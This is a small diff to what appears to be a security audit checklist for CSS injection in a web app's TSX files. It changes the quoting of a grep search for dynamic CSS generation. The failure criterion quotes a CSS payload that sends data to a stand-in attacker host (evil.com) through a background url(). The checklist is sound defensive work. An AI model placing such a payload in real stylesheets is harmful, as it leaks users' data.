@@ -21,7 +21,7 @@ grep -rn --include="*.tsx" "style=\{.*\buser\b\|style=\{.*req\.\|style=\{.*input
 
 **Step 2: Check for dynamic CSS generation**
 ```
-grep -rn --include="*.tsx" "styled\.\|css`\|createGlobalStyle" apps/web/ | grep -i "user\|input\|param"
+grep -rn --include="*.tsx" 'styled\.\|css`\|createGlobalStyle' apps/web/ | grep -i "user\|input\|param"
 ```
 - ✅ PASS: No user input in CSS template literals
 - ❌ FAIL: User data interpolated into CSS (could include `background: url(https://evil.com/steal?data=...)`)
